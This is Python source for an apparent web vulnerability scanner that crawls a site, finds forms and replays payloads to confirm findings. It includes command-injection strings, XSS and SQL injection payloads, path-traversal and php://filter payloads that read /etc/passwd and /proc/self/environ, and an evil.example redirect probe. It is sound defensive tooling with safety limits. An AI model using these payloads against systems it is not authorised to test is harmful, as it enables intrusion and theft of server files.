"""Blind engagement runner: the real-world flow, with no hand-fed endpoints.

  crawl (blind, authenticated, logout-safe)
    -> discover forms + CSRF tokens
    -> build injection targets (url, method, params, csrf)
    -> run tools form-aware and CSRF-aware (each param tested)
    -> verify findings by deterministic replay (kill FPs)
    -> score

This is what runs against a real target: it does not know where the vulnerabilities are.
CSRF handling gets past per-request tokens on hardened forms; form-awareness tests POST
params; verification confirms each hit so a payload-set gap in one tool is caught by another
and false positives never reach the report.
"""

from __future__ import annotations

import json
import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from .orchestrator.forms import fetch_forms


@dataclass
class Target:
    url: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    values: dict = field(default_factory=dict)
    csrf_field: str | None = None
    csrf_url: str = ""

    def data_string(self, mark: str = "1") -> str:
        return "&".join(f"{p}={self.values.get(p) or mark}" for p in self.params)


@dataclass
class Finding:
    tool: str
    category: str
    url: str
    param: str | None = None
    method: str = "GET"
    evidence: str = ""
    verified: bool | None = None       # None=unverified, True=confirmed, False=refuted
    verify_note: str = ""


def _run(args: list[str], timeout: int, stdin: str | None = None) -> str:
    try:
        p = subprocess.run(args, input=stdin, capture_output=True, text=True,
                           timeout=timeout, check=False)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"__EXEC_ERROR__ {exc}"


# ----- discovery --------------------------------------------------------------

def blind_crawl(target: str, cookie: str, depth: int = 3, duration: str = "3m",
                politeness=None) -> list[str]:
    """katana blind crawl (logout-safe, host-scoped, plain-URL output)."""
    args = ["katana", "-u", target, "-jc", "-silent", "-d", str(depth), "-ct", duration,
            "-cos", "logout|signout|/setup|reset", "-fs", "fqdn", "-kf", "all"]
    args += politeness.katana_flags() if politeness else ["-c", "10"]
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=600)
    urls = sorted({ln.strip() for ln in out.splitlines() if ln.strip().startswith("http")})
    return urls


def discover_targets(urls: list[str], cookie: str, host: str) -> list[Target]:
    """Turn crawled URLs into injection targets: GET URLs with query params, and every
    discovered form (POST/GET) with its CSRF token."""
    targets: list[Target] = []
    seen: set = set()
    # host may carry a port (localhost:3000) while urlsplit(...).hostname strips it — compare
    # hostname to hostname or every param URL on a non-80/443 target is silently skipped.
    want_host = (host or "").rsplit("@", 1)[-1].split(":")[0].lower()

    for u in urls:
        parts = urlsplit(u)
        if parts.query and (parts.hostname or want_host).lower() == want_host:
            params = sorted({kv.split("=")[0] for kv in parts.query.split("&") if kv})
            key = (parts.path, "GET", tuple(params))
            if key not in seen:
                seen.add(key)
                targets.append(Target(url=u, method="GET", params=params))

    # forms (fetch each unique page once)
    for page in sorted({u.split("?")[0] for u in urls}):
        if (urlsplit(page).hostname or want_host).lower() != want_host:
            continue
        for f in fetch_forms(page, cookie):
            ip = f.injectable_params()
            if not ip:
                continue
            key = (urlsplit(f.action).path, f.method, tuple(sorted(ip)))
            if key in seen:
                continue
            seen.add(key)
            targets.append(Target(url=f.action, method=f.method, params=ip, values=f.values,
                                  csrf_field=f.csrf_field, csrf_url=f.csrf_url))
    return targets


# ----- response pipeline (Burp-style passive inspection of EVERY response) ----
# Any response the probes generate (including AUDIT-time responses to injected payloads) is
# fed to the active PII sink, so PII that only surfaces in an error/audit response is caught
# (that's how Burp found the WAVSEP email — not on the crawled page, but in an audit response).
_PII_SINK = None


def set_pii_sink(collector) -> None:
    global _PII_SINK
    _PII_SINK = collector


def _feed(url: str, body: str) -> None:
    sink = _PII_SINK
    if sink is not None and body:
        try:
            sink.feed(url, body)
        except Exception:  # noqa: BLE001,S110 - inspection must never break a probe
            pass


# ----- verification (deterministic replay) ------------------------------------

def verify_cmdi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Replay a command-injection marker across common separators (incl. the bare-pipe
    bypass that DVWA-high allows). Confirms by the `id` command output signature."""
    import httpx
    seps = [";id", "|id", "| id", "&&id", "%0aid", "`id`", "$(id)"]
    headers = {"Cookie": cookie} if cookie else {}
    for sep in seps:
        payload = f"127.0.0.1{sep}"
        try:
            if method == "POST":
                r = httpx.post(url, data={param: payload, "Submit": "Submit"},
                               headers=headers, follow_redirects=True, timeout=12)
            else:
                r = httpx.get(url, params={param: payload}, headers=headers,
                              follow_redirects=True, timeout=12)
        except Exception:  # noqa: BLE001, S112
            continue
        _feed(url, r.text)   # passive PII inspection of the audit-time response (Burp-style)
        if "uid=" in r.text and "gid=" in r.text:
            return True, f"cmd exec confirmed via '{sep}' (uid= in response)"
    return False, "no command output on replay"


def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    import httpx
    marker = "dxsc9k1z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = {"Cookie": cookie} if cookie else {}
    try:
        if method == "POST":
            r = httpx.post(url, data={param: payload}, headers=headers,
                           follow_redirects=True, timeout=12)
        else:
            r = httpx.get(url, params={param: payload}, headers=headers,
                          follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    _feed(url, r.text)   # passive PII inspection of the audit-time response (Burp-style)
    # confirmed only if the payload is reflected UN-encoded (real XSS, not encoded echo)
    if payload in r.text:
        return True, "payload reflected unencoded"
    if marker in r.text and "&lt;" in r.text:
        return False, "reflected but HTML-encoded (not exploitable)"
    return False, "not reflected"


# SQL-error signatures (MySQL/generic) — strong, low-FP.
_SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "supplied argument is not a valid mysql", "sqlstate[", "unclosed quotation mark",
    "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
    "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
]
_REDIRECT_PARAMS = {"redirect", "url", "next", "return", "returnurl", "dest", "destination",
                    "go", "target", "rurl", "redir", "continue", "forward"}


def _req(method, url, param, value, cookie, follow=True):
    import httpx
    headers = {"Cookie": cookie} if cookie else {}
    # Include Submit=Submit: DVWA-style forms only process the input when the submit button
    # is present. Harmless extra param elsewhere.
    if method == "POST":
        resp = httpx.post(url, data={param: value, "Submit": "Submit"}, headers=headers,
                          follow_redirects=follow, timeout=12)
    else:
        resp = httpx.get(url, params={param: value, "Submit": "Submit"}, headers=headers,
                         follow_redirects=follow, timeout=12)
    _feed(url, resp.text)   # passive PII inspection of the audit-time response (Burp-style)
    return resp


def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Error-based (inject a quote -> DB error) then boolean-based (true vs false response
    length differs). Strong signatures only, to stay low false-positive."""
    try:
        err = _req(method, url, param, "1'\"", cookie).text.lower()
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    for sig in _SQL_ERRORS:
        if sig in err:
            return True, f"SQL error signature: {sig!r}"
    # boolean-based: TRUE payload vs FALSE payload should differ materially
    try:
        t = _req(method, url, param, "1' OR '1'='1", cookie).text
        f = _req(method, url, param, "1' AND '1'='2", cookie).text
        base = _req(method, url, param, "1", cookie).text
    except Exception:  # noqa: BLE001
        return False, "boolean replay failed"
    if len(t) != len(f) and abs(len(t) - len(base)) < abs(len(f) - len(base)):
        return True, f"boolean-based diff (true={len(t)} false={len(f)} base={len(base)})"
    return False, "no SQL error or boolean signal"


def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Local/Remote file read: try classic traversal + php filter wrappers, confirm by the
    /etc/passwd root line signature (also Windows win.ini + base64/wrapper variants)."""
    payloads = [
        # *nix traversal (varying depth) + absolute
        "/etc/passwd", "../etc/passwd", "../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        # traversal-filter bypasses
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",           # url-encoded
        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",    # double-encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # null-byte / extension-append bypasses (legacy PHP)
        "/etc/passwd%00", "../../../../../../etc/passwd%00.html",
        # php wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/resource=/etc/passwd",
        # other readable *nix files
        "/proc/self/environ", "/etc/hostname",
        # Windows
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../../../windows/win.ini",
        "c:\\windows\\win.ini",
        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    ]
    for p in payloads:
        try:
            r = _req(method, url, param, p, cookie)
        except Exception:  # noqa: BLE001, S112
            continue
        t = r.text
        if "root:x:0:0" in t:
            return True, f"read /etc/passwd via {p!r}"
        if "cm9vdDp4OjA6MDp" in t:                    # base64 of 'root:x:0:0:'
            return True, f"read /etc/passwd (base64 filter) via {p!r}"
        if "[extensions]" in t.lower() or "[fonts]" in t.lower() or "for 16-bit app support" in t.lower():
            return True, f"read Windows win.ini via {p!r}"
        if "DOCUMENT_ROOT=" in t or "HTTP_USER_AGENT=" in t:  # /proc/self/environ
            return True, f"read /proc/self/environ via {p!r}"
    return False, "no file-read signature"


def verify_open_redirect(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Only meaningful on redirect-ish params: inject an external URL and confirm the app
    issues a 30x Location to it (do NOT follow redirects)."""
    if param.lower() not in _REDIRECT_PARAMS:
        return False, "param not redirect-like"
    evil = "https://evil.example/x"
    try:
        r = _req(method, url, param, evil, cookie, follow=False)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    # 1) HTTP 30x Location header
    loc = r.headers.get("location", "")
    if r.status_code in (301, 302, 303, 307, 308) and "evil.example" in loc:
        return True, f"30x redirect to {loc}"
    # 2) body-based redirect: meta refresh / window.location / anchor to the injected URL
    body = r.text.lower()
    if "evil.example" in body:
        for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
                    "location.href", "location.replace", "location.assign"):
            if pat in body:
                return True, f"body-based redirect ({pat}) to evil.example"
    return False, f"no external redirect (status {r.status_code})"


def verify_stored_xss(target: Target, param: str, cookie: str) -> tuple[bool, str]:
    """Inject via the form, then re-fetch the page and check the payload persisted unencoded."""
    import httpx
    marker = "stx7q2z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = {"Cookie": cookie} if cookie else {}
    data = {p: (target.values.get(p) or "x") for p in target.params}
    data[param] = payload
    data.setdefault("Submit", "Submit")
    try:
        httpx.post(target.url, data=data, headers=headers, follow_redirects=True, timeout=12)
        view = httpx.get(target.csrf_url or target.url, headers=headers,
                         follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    if payload in view.text:
        return True, "stored payload persisted unencoded"
    return False, "not stored / encoded"


def verify_finding(f: Finding, cookie: str) -> Finding:
    if f.category == "command-injection":
        ok, note = verify_cmdi(f.url, f.param or "ip", f.method, cookie)
    elif f.category == "xss":
        ok, note = verify_reflected_xss(f.url, f.param or "", f.method, cookie)
    elif f.category == "sql-injection":
        ok, note = verify_sqli(f.url, f.param or "id", f.method, cookie)
    elif f.category == "file-inclusion":
        ok, note = verify_lfi(f.url, f.param or "page", f.method, cookie)
    elif f.category == "open-redirect":
        ok, note = verify_open_redirect(f.url, f.param or "redirect", f.method, cookie)
    else:
        f.verified = None
        f.verify_note = "tool-confirmed (no independent replay for this class)"
        return f
    f.verified = ok
    f.verify_note = note
    return f


# ----- detection (tool runners, form + CSRF aware) ----------------------------

def run_nuclei_dast(urls: list[str], cookie: str, politeness=None) -> list[Finding]:
    if not urls:
        return []
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    args = ["nuclei", "-l", path, "-dast", "-jsonl", "-silent"]
    if politeness:
        args += politeness.nuclei_flags()
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    # nuclei buffers output until it exits, so a timeout-kill loses EVERYTHING it found. Give it
    # a generous budget (overridable) so it completes on a large frontier instead of being killed
    # empty — the silent 0-findings bug on the WAVSEP benchmark.
    out = _run(args, timeout=int(os.environ.get("DASTNG_NUCLEI_TIMEOUT", "5400") or "5400"))
    from .scoring.normalize import normalize_nuclei
    return [Finding(tool="nuclei", category=n.category, url=n.url, param=n.param,
                    evidence=(n.raw.get("info", {}) or {}).get("name", ""))
            for n in normalize_nuclei(out)]


def run_sqlmap(t: Target, cookie: str, politeness=None, policy=None,
               level_override: int | None = None) -> list[Finding]:
    """CSRF-aware sqlmap: passes --csrf-token/--csrf-url when the form carries a token.
    Injection depth (level/risk/technique) comes from the ScanPolicy: production-safe uses
    level 2 / risk 1 / BEU (no time-hang, no stacked queries -> cannot mutate/hang the DB).
    level_override (from the adaptive TargetHealth monitor) caps the level when the target is
    under stress, so a fragile target gets reduced depth instead of being hammered to death."""
    args = ["sqlmap", "--batch", "--disable-coloring", "--flush-session"]
    if policy is not None:
        lvl = level_override if level_override else policy.sqlmap_level
        args += ["--level", str(lvl), "--risk", str(policy.sqlmap_risk),
                 f"--technique={policy.sqlmap_technique}"]
    else:
        args += ["--level", str(level_override or 2), "--risk", "2", "--technique=BEUST"]
    if politeness:
        args += politeness.sqlmap_flags()
    if t.method == "POST":
        args += ["-u", t.url, "--data", t.data_string()]
    else:
        args += ["-u", f"{t.url}?{t.data_string()}" if "?" not in t.url else t.url]
    if cookie:
        args += ["--cookie", cookie]
    if t.csrf_field:
        args += ["--csrf-token", t.csrf_field, "--csrf-url", t.csrf_url]
    # Bound wall-time per parameter. sqlmap BEU confirms a detectable injection within a couple
    # minutes; grinding 10 min/param mostly means it is NOT injectable (pure waste + sustained
    # load that kills fragile targets). Keep it tight so the depth pass over N params can never
    # monopolize the scan or pin the target: full=180s, reduced (stressed target)=120s.
    _to = 180 if (level_override or (policy.sqlmap_level if policy else 2)) >= 5 else 120
    out = _run(args, timeout=_to)
    from .scoring.normalize import normalize_sqlmap
    return [Finding(tool="sqlmap", category="sql-injection", url=t.url, param=n.param,
                    method=t.method, evidence="sqlmap-confirmed")
            for n in normalize_sqlmap(out)]


def run_nuclei_exposures(urls: list[str], cookie: str, politeness=None) -> list[Finding]:
    """Passive info-disclosure via nuclei's exposures + misconfiguration templates and our
    PII/email extractor — the CLI analog to Burp's passive scanner (source-code / private-key
    / token / config disclosure, emails/PII). Detection lives in nuclei's engine + versioned
    YAML, not bespoke code regex. Read-only GETs, so safe under any policy."""
    if not urls:
        return []
    import os
    tdirs = [os.path.expanduser("~/nuclei-templates/http/exposures"),
             os.path.expanduser("~/nuclei-templates/http/misconfiguration"),
             os.path.join(os.path.dirname(__file__), "rules", "pii-disclosure.yaml")]
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    args = ["nuclei", "-l", path, "-jsonl", "-silent"]
    for t in tdirs:
        if os.path.exists(t):
            args += ["-t", t]
    if politeness:
        args += politeness.nuclei_flags()
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    out = _run(args, timeout=1800)
    findings: list[Finding] = []
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = o.get("info", {}) or {}
        cat = "pii-disclosure" if "pii" in (o.get("template-id") or "") else "info-disclosure"
        findings.append(Finding(tool="nuclei", category=cat,
                                url=o.get("matched-at") or o.get("url") or "",
                                param=o.get("template-id"),
                                evidence=(info.get("name") or o.get("template-id") or "")[:160],
                                verified=True))
    return findings


def probe_targets(targets: list[Target], cookie: str, politeness=None,
                  fuzz_forms: bool = True) -> list[Finding]:
    """Completeness safety-net: independently replay EVERY blatant-vuln class on every
    discovered param, so a payload-set gap in any scanner does not become a missed finding.
    Deterministic, strong-signature checks only (low false-positive). Throttled when a
    politeness profile is given (avoids tripping rate limits/WAF on production targets).
    When fuzz_forms is False (production-safe), stored-XSS (which WRITES data) is skipped."""
    from .safety import is_auth_endpoint
    out: list[Finding] = []

    def add(cat, url, param, method, note):
        out.append(Finding(tool="verify", category=cat, url=url, param=param,
                           method=method, evidence=note, verified=True))

    for t in targets:
        if is_auth_endpoint(t.url):   # never inject auth endpoints
            continue
        if politeness:
            politeness.wait()
        for param in t.params:
            ok, note = verify_cmdi(t.url, param, t.method, cookie)
            if ok:
                add("command-injection", t.url, param, t.method, note)
            ok, note = verify_reflected_xss(t.url, param, t.method, cookie)
            if ok:
                add("xss", t.url, param, t.method, note)
            ok, note = verify_sqli(t.url, param, t.method, cookie)
            if ok:
                add("sql-injection", t.url, param, t.method, note)
            ok, note = verify_lfi(t.url, param, t.method, cookie)
            if ok:
                add("file-inclusion", t.url, param, t.method, note)
            ok, note = verify_open_redirect(t.url, param, t.method, cookie)
            if ok:
                add("open-redirect", t.url, param, t.method, note)
            # stored XSS only makes sense on POST forms (inject then re-view the page).
            # It WRITES data, so it is skipped under production-safe (fuzz_forms=False).
            if t.method == "POST" and fuzz_forms:
                ok, note = verify_stored_xss(t, param, cookie)
                if ok:
                    add("xss", t.url, param, t.method, f"stored: {note}")
    return out


# Category per roster tool (adapter finding dicts vary; this is the fallback classification).
_ROSTER_CAT = {
    "dalfox": "xss", "ghauri": "sql-injection", "commix": "command-injection",
    "crlfuzz": "crlf-injection", "sstimap": "ssti", "lfi_fuzz": "file-inclusion",
    "rfi_oast": "rfi", "dotdotpwn": "file-inclusion", "schemathesis": "api-fuzz",
    "jwt_tool": "jwt", "graphw00f": "graphql", "gitleaks": "secret", "trufflehog": "secret",
}
# The full detection roster the mega scan runs over the SAFE frontier. nuclei + sqlmap are
# already hand-coded above; ZAP is intentionally excluded (its full-scan re-crawls and can
# crash fragile targets — the failure we hit on WAVSEP; use `launch -w full` if you want it).
_MEGA_ROSTER = ["dalfox", "ghauri", "lfi_fuzz", "commix", "crlfuzz", "sstimap", "rfi_oast",
                "dotdotpwn", "schemathesis", "jwt_tool", "graphw00f", "gitleaks", "trufflehog"]


# Roster tools that loop one subprocess PER URL (expensive at scale) vs tools that batch a whole
# URL list in one process. Batch tools always get the FULL frontier (they scale and are the
# primary breadth detectors — dalfox for XSS especially); per-URL tools get a stratified,
# per-category-balanced cap so they cover a SPREAD of the surface instead of the first N of a
# sorted list (the bug that fed dalfox 40 LFI URLs and zero XSS on the first WAVSEP benchmark).
_PER_URL_TOOLS = {"ghauri", "commix", "lfi_fuzz", "sstimap", "rfi_oast", "dotdotpwn"}


def _stratified_sample(urls: list[str], cap: int) -> list[str]:
    """Round-robin sample up to `cap` URLs spread across path-directory groups, so a per-URL
    tool sees a balance of every app area / vuln category rather than all-of-one. cap<=0 = all."""
    if cap <= 0 or len(urls) <= cap:
        return urls
    groups: dict[str, list[str]] = {}
    for u in urls:
        d = urlsplit(u).path.rsplit("/", 1)[0]
        groups.setdefault(d, []).append(u)
    order = sorted(groups)
    out: list[str] = []
    i = 0
    while len(out) < cap and any(groups[g] for g in order):
        g = order[i % len(order)]
        if groups[g]:
            out.append(groups[g].pop(0))
        i += 1
    return out


def run_roster(target: str, safe_urls: list[str], cookie: str, policy,
               js_dir: str = "", level_override: int | None = None, health=None,
               per_url_cap: int = 0) -> list[Finding]:
    """Run the full detection roster over the SAFE, converged frontier and normalize each
    adapter's findings to Finding. Tools whose surface is absent (GraphQL/OpenAPI/JWT/JS)
    cleanly no-op. Every tool is isolated so one failure never sinks the scan.

    level_override caps injection depth under target stress; a TargetHealth monitor (health)
    is re-checked between tools so the roster halts gracefully instead of grinding a dead target
    through every remaining tool's full timeout."""
    from .orchestrator.adapters import REGISTRY
    from .orchestrator.adapters.base import RunContext
    _lvl = level_override or policy.sqlmap_level
    # Shorter per-tool budget once stressed (reduced depth) so no single tool pins a fragile app.
    _to = 1800 if _lvl >= 5 else 600
    # CRITICAL for "safe": the roster subprocess tools default to aggressive concurrency
    # (dalfox = 100 workers, crlfuzz = 25) that DoSes a fragile single-process target — this is
    # what killed the Juice Shop demo mid-roster. Propagate the policy's politeness so every
    # tool honors the same throttle the Python probes do.
    _pol = policy.politeness
    opts = {"cookie": cookie, "inject_cap": 0, "timeout": _to,
            "sqlmap_level": _lvl, "sqlmap_risk": policy.sqlmap_risk,
            "sqli_level": _lvl, "lfi_deep": policy.lfi_deep, "js_dir": js_dir,
            "workers": max(1, _pol.concurrency), "delay_ms": _pol.delay_ms,
            "rps": _pol.rps,
            # RFI/SSRF out-of-band detection: interface the target can reach back to (a same-LAN
            # IP for a self-hosted OastServer, or a public interactsh host). Without it, rfi_oast
            # falls back to in-band reflection only. Set via DASTNG_OAST_HOST_IP.
            "oast_host_ip": os.environ.get("DASTNG_OAST_HOST_IP", "")}
    # Per-URL tools get a stratified, per-category-balanced subset; batch tools get everything.
    capped_urls = _stratified_sample(safe_urls, per_url_cap) if per_url_cap else safe_urls
    out: list[Finding] = []
    for name in _MEGA_ROSTER:
        ad = REGISTRY.get(name)
        if ad is None or not ad.available():
            continue
        if getattr(ad, "active", False) and not policy.active_scan:
            continue
        # Circuit breaker: if the target went unhealthy, stop launching more active tools
        # (the halt is surfaced via health.events in the run summary, never silently).
        if health is not None and getattr(ad, "active", False) and health.check() >= 2:
            break
        tool_urls = capped_urls if name in _PER_URL_TOOLS else safe_urls
        try:
            res = ad.run(RunContext(target=target, seed_urls=tool_urls, options=opts))
        except Exception:  # noqa: BLE001,S112 - one tool must never sink the mega scan
            continue
        cat = _ROSTER_CAT.get(name)
        for f in (res.findings or []):
            fcat = cat or f.get("category") or f.get("type") or f.get("name") or name
            url = f.get("url") or f.get("matched-at") or f.get("data") or target
            ev = f.get("evidence") or f.get("name") or f.get("message_str") or ""
            out.append(Finding(tool=name, category=fcat, url=str(url).split("?")[0],
                               param=f.get("param"), evidence=str(ev)[:160]))
    return out


def run_engagement(target: str, cookie: str, host: str, depth: int = 3, *,
                   dom: bool = True, tools: bool = True, profile: str = "safe-deep",
                   zap: bool = True) -> dict:
    """Full blind flow covering BOTH profiles: blatant injection (DVWA-style) AND the
    hardened-app profile (config/passive + vulnerable JS + API + DOM-based). Returns
    {urls, targets, findings} with findings verified.

    profile: ScanPolicy name. 'production-safe' (live/client infra) throttles hard, sends NO
    data-mutating traffic, skips destructive/notifying endpoints, and limits sqlmap to safe
    techniques. 'passive-only' sends no attack traffic at all. 'staging'/'aggressive' are for
    disposable targets. Auth endpoints (login/logout/reset) are NEVER actively tested under any
    profile, so the scan cannot lock accounts."""
    from .dom import dom_probe
    from .jsanalysis import analyze_js
    from .passive import passive_scan
    from .safety import get_policy, is_auth_endpoint, is_state_changing

    policy = get_policy(profile)
    pol = policy.politeness
    # Rate override for robust targets (owned labs / benchmark apps with thousands of cases):
    # safe-deep's 2-rps throttle is right for fragile client prod, but it makes the active
    # detectors (nuclei-dast/dalfox) time out over a huge frontier. DASTNG_RPS / DASTNG_CONCURRENCY
    # let an operator raise the rate for a target that can take it, WITHOUT changing depth
    # (L5 / full payloads / full roster stay the same). The adaptive health monitor still backs
    # off if the target starts struggling, so this is a ceiling, not a foot-gun.
    _rps_ov, _conc_ov = os.environ.get("DASTNG_RPS"), os.environ.get("DASTNG_CONCURRENCY")
    if _rps_ov or _conc_ov:
        import dataclasses
        pol = dataclasses.replace(pol, rps=float(_rps_ov or pol.rps),
                                  concurrency=int(_conc_ov or pol.concurrency))
        policy = dataclasses.replace(policy, politeness=pol)  # so run_roster sees it too
    urls = blind_crawl(target, cookie, depth=depth, politeness=pol)

    # Convergence discovery — the crawl alone misses surface the scanners then never see. Feed
    # the frontier from two more sources so nuclei/PII/injection cover what katana can't reach:
    #  (a) link-harvester: exhaustively expand index/listing pages katana under-follows.
    #  (b) feroxbuster: content brute-force well-known sensitive paths + API roots (/ftp, /.git,
    #      /.env, /swagger, /actuator, backups) — the holes nothing links to.
    from .orchestrator.adapters import REGISTRY
    from .orchestrator.adapters.base import RunContext as _RC
    # Discovery throttle: gentle but not glacial. feroxbuster's default 50 threads DoSes
    # fragile single-process apps, but the policy's 2-rps floor timed out over a 4.7k wordlist.
    # Content discovery is read-only GETs (lower risk than injection). Derive a conservative
    # ceiling from the policy; feroxbuster's --auto-tune/--auto-bail (set in the adapter) then
    # self-lower the rate and abort if the target struggles, so this is a ceiling, not a floor.
    _ferox_threads = max(4, pol.concurrency * 2) if pol else 8
    _ferox_rate = max(10, int(pol.rps * pol.concurrency * 2)) if pol else 15
    _dopts = {"cookie": cookie, "harvest_rounds": 3, "ferox_depth": 2, "timeout": 1500,
              "ferox_threads": _ferox_threads, "ferox_rate": _ferox_rate}
    if os.environ.get("DASTNG_FEROX_WORDLIST"):   # operator override (e.g. a fast list)
        _dopts["ferox_wordlist"] = os.environ["DASTNG_FEROX_WORDLIST"]
    for _tool, _seeds in (("linkharvest", urls), ("feroxbuster", None)):
        try:
            _r = REGISTRY[_tool].run(_RC(target=target, seed_urls=_seeds or [], options=_dopts))
            if _r.discovered_urls:
                urls = sorted(set(urls) | set(_r.discovered_urls))
        except Exception:  # noqa: BLE001,S112 - a discovery tool failing must not sink the scan
            continue

    # JS/API discovery: pull API routes out of JS so unlinked endpoints get tested too.
    js_urls = [u for u in urls if u.split("?")[0].endswith(".js")]
    api_eps, vuln_libs = analyze_js(js_urls, cookie, host)
    urls = sorted(set(urls) | set(api_eps))

    targets = discover_targets(urls, cookie, host)
    # SAFETY: never actively test auth endpoints (submitting payloads/failed logins there
    # locks accounts and logs the scanner out). Passive checks still cover them read-only.
    targets = [t for t in targets if not is_auth_endpoint(t.url)]
    # SAFETY: under production-safe, never fuzz destructive/notifying endpoints
    # (delete/send/pay/...). They are still crawled + passively analyzed, just not attacked.
    active_targets = targets
    skipped_state_changing = 0
    if policy.skip_state_changing:
        active_targets = [t for t in targets if not is_state_changing(t.url)]
        skipped_state_changing = len(targets) - len(active_targets)
    # production-safe also skips POST-form fuzzing entirely (no data mutation)
    if not policy.fuzz_forms:
        active_targets = [t for t in active_targets if t.method != "POST"]
    findings: list[Finding] = []

    # Response-pipeline PII sink: every probe response (incl. audit-time responses to injected
    # payloads) is inspected for PII, Burp-style — not just the crawled surface.
    from .pii import ResponsePiiCollector
    _pii_collector = ResponsePiiCollector()
    set_pii_sink(_pii_collector)

    # Adaptive target-health monitor: keeps safe-deep one profile that self-throttles. It is
    # pinged between heavy stages; a stressed target steps L5 -> L3, a failing one halts the
    # active scan (findings preserved) instead of grinding for hours against a dying app —
    # which is exactly what DoSed the fragile demo target on the first full run.
    from .safety import TargetHealth
    health = TargetHealth(base_url=target, cookie=cookie)

    # Per-parameter subprocess tools (sqlmap/ghauri/commix in the roster) cost one process per
    # target; on a benchmark app with thousands of parameterized cases (WAVSEP) that is days of
    # runtime. DASTNG_INJECT_CAP bounds how many params those heavy tools attack (0 = unbounded).
    # The SCALABLE detectors that give recall — nuclei-dast (batch) + dalfox (batch) +
    # deterministic probe_targets — still run over ALL cases, so recall is not capped, only the
    # slow exploitation depth is. The cap is surfaced in the summary (never a silent truncation).
    _inject_cap = int(os.environ.get("DASTNG_INJECT_CAP", "0") or "0")

    # 1) FAST detection breadth first — capture the full matrix while the target is certainly
    #    alive, BEFORE the heavy sqlmap depth pass (section 5). Ordering matters: sqlmap L5 is
    #    the slowest + most target-hostile stage and adds little the fast detectors miss, so it
    #    runs LAST; a fragile target that dies under it has already yielded everything else.
    #    Skipped entirely under passive-only (active_scan=False): read-only recon.
    if tools and policy.active_scan:
        findings += run_nuclei_dast([t.url for t in active_targets
                                     if t.method == "GET" and t.params], cookie, politeness=pol)
        # Full detection roster over the SAFE frontier (dalfox/ghauri/lfi_fuzz/commix/crlfuzz/
        # sstimap/rfi_oast/dotdotpwn/schemathesis/jwt_tool/graphw00f/gitleaks/trufflehog).
        # This is what makes it the mega scan — the roster, not just the core subset.
        if not health.halted:
            # FULL frontier to the roster: batch tools (dalfox/nuclei) cover every case; the
            # per-URL subprocess tools get a stratified per-category cap inside run_roster.
            _safe_urls = [t.url for t in active_targets if t.params] or \
                [t.url for t in active_targets]
            findings += run_roster(target, _safe_urls, cookie, policy,
                                   js_dir=os.environ.get("DASTNG_JS_DIR", ""),
                                   level_override=health.sqlmap_level(policy.sqlmap_level),
                                   health=health, per_url_cap=_inject_cap)
        # completeness probes only while the target is alive (they replay payloads = more load)
        if not health.halted:
            findings += probe_targets(active_targets, cookie, politeness=pol,
                                      fuzz_forms=policy.fuzz_forms)
        # verify (deterministic replay) the fast-detector findings now, while the target is
        # still healthy — sqlmap (section 5) may stress it afterward.
        findings = [verify_finding(f, cookie) for f in findings]

    # 2) passive/config (hardened-app bulk: headers, cookies, CORS, TLS hygiene)
    for pf in passive_scan(urls, cookie):
        findings.append(Finding(tool="passive", category=pf.category, url=pf.url,
                                param=pf.check, evidence=pf.detail, verified=True))

    # 2b) passive info-disclosure via CLI detectors (nuclei exposures/misconfig + PII/email
    # extractor) — the OSS analog to Burp's passive scanner (source/key/token/config
    # disclosure, emails/PII). Read-only GETs, so run regardless of active-scan policy.
    if tools:
        findings += run_nuclei_exposures(urls, cookie, politeness=pol)

    # 2c) PII / PHI disclosure (Presidio, Burp-style) — high-precision structured profile
    # (email, SSN, card w/ Luhn, IBAN, medical/passport/ITIN; NO NER-names, which false-
    # positive on markup). Two sources, merged: (a) the response-pipeline sink = PII seen in
    # AUDIT-time responses (how Burp caught the WAVSEP email), (b) a passive scan of the
    # crawled surface. Masked values only, never raw PHI. High value for FHC (healthcare).
    from .pii import scan_urls as _pii_scan
    set_pii_sink(None)   # stop capturing; drain what the probes fed
    _pii = list(_pii_collector.hits())
    _html = [u for u in urls if not u.split("?")[0].endswith(
        (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".map"))]
